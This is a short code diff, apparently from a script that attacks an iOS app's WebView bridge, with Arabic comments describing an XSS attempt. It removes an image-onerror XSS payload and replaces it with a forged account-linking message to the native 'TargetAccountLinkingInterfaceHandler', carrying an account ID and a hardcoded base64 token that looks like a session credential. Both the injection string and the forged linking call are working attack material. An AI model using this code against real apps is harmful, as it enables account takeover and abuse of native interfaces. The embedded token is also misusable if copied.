@@ -41,7 +41,9 @@
       try {
         // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
         window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-         id: "\"><img src=x onerror=alert('XSS')>"
+        accountId: "863776540939551628",
+        action: "link",
+        token: "MTQzMTU5NDo4MTMzOTI1MjAxMDgxNzE2NzA6OTIyMzM3MjAzNjg1NDc3NTgwNzoxfDE3NTM2NzEzMjE6MC0tMjg0YmE0ZDE5Yjc2YjdlY2ViODAyYTc4ODc5NDNkMTg="
         });
         alert("✅ Sent XSS payload to TargetAccountLinkingInterfaceHandler");
       } catch (e) {
